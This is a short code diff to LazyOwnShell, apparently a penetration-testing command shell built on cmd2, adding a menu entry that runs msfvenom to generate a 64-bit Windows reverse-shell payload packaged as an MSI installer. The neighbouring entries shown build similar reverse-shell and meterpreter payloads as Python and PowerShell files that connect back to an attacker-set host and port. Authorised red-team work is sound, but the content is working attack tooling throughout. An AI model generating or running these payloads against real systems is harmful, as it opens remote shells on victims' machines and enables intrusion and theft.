@@ -1837,6 +1837,9 @@ class LazyOwnShell(cmd2.Cmd):
             "19": (
                 f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" EXITFUNC=thread -b "\\x00\\x0d\\x0a" -f python > sessions/run.py'
             ),
+            "20": (
+                f'msfvenom -p windows/x64/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f msi > sessions/shell64.msi'
+            ),
             "21": (
                 f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f psh > sessions/Shell.ps1'
             )
